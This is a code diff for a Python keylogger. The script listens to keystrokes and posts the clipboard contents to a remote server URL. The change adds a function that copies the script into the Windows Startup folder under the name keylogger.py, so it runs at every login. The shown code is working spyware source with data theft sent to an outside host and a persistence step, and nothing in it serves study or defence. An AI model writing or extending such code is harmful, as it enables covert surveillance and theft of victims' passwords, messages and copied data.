@@ -4,6 +4,7 @@ import re
 import time
 import requests
 import pyperclip
+import shutil
 
                     #--Modify these--#
 ######################################################## 
@@ -74,14 +75,16 @@ def copyClipboard():
     clipboard = pyperclip.paste()
     # Only send a request if the clipboard content has changed
     response = requests.post(url+'/clipboard', data=clipboard)
-        
 
-def test():
-    print("test")
+def toStart():
+    try:
+        shutil.copyfile(__file__,'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\keylogger.py')
+    except PermissionError as e:
+        print("We have a permission error")
+
 ################################
 #------ MAIN FUNCTION ---------#
 if __name__ == "__main__":
-    
     shift_pressed = False
     caps_lock_pressed = False
     listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
